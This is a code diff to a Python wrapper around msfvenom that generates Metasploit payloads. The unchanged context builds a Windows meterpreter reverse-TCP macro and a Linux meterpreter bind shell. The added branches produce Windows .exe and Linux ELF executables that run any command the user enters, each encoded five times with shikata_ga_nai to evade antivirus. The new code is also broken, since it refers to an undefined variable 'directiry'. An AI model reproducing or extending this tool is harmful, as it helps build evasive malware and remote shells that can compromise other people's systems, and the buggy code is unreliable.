@@ -60,6 +60,17 @@ def windows(namder):
         subprocess.call(
             f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
     
+    elif namder == 9:
+        cmd = str(input('cmd: '))
+        directory = str(input('dir save: '))
+        b = list(directory)
+        if b[-1] != '/':
+            directory += '/'
+        name = str(input('name_file: '))
+
+        subprocess.check_output(
+            f'msfvenom -p windows/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f exe > {directiry}{name}.exe', shell=True)
+    
     
     else:
         a = 0
@@ -95,6 +106,17 @@ def linux(namder):
 
         subprocess.check_output(
             f'msfvenom -p linux/x86/meterpreter/bind_tcp lport={port} -e x86/shikata_ga_nai -i 5 - f elf > {directory}{name}', shell=True)
+    
+    elif namder == 4:
+        cmd = str(input('cmd: '))
+        directory = str(input('dir save: '))
+        b = list(directory)
+        if b[-1] != '/':
+            directory += '/'
+        name = str(input('name_file: '))
+
+        subprocess.check_output(
+            f'msfvenom -p linux/x86/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f elf > {directiry}{name}', shell=True)
     
     else:
         a = 0
